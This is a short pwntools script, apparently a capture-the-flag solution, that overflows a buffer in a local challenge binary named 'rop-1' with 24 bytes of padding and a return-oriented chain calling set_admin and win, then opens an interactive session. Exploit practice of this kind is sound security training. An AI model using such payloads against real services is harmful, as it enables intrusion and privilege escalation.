from pwn import *

io = remote("localhost", 1337)

elf = ELF("rop-1")
set_admin = elf.symbols["set_admin"]
win = elf.symbols["win"]

buf = b"A" * 24

buf += p64(set_admin)
buf += p64(win)

# Send the payload and get any response
io.sendline(buf)
io.interactive(prompt="")
